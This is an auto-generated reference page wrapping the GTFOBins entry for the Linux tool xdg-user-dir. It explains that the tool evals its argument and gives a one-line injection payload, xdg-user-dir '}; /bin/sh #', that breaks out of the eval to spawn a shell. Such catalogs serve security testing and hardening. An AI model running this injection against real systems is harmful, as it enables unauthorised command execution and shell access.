---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# xdg-user-dir

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `xdg-user-dir` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/xdg-user-dir` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for xdg-user-dir covering shell.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/xdg-user-dir.md)
- Source verification: [source record](../../sources/gtfobins/xdg-user-dir.md)

## Aliases

- `xdg-user-dir`

## Source Verification

[source record](../../sources/gtfobins/xdg-user-dir.md)

## Evidence Excerpt

```text
_body: ''
_name: xdg-user-dir
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/xdg-user-dir
comment: The current implementation of `xdg-user-dir` is basically `eval echo \${XDG_${1}_DIR:-$HOME}`, thus is can be easily
used to achieve command execution.
functions:
shell:
- code: 'xdg-user-dir ''}; /bin/sh #'''
```
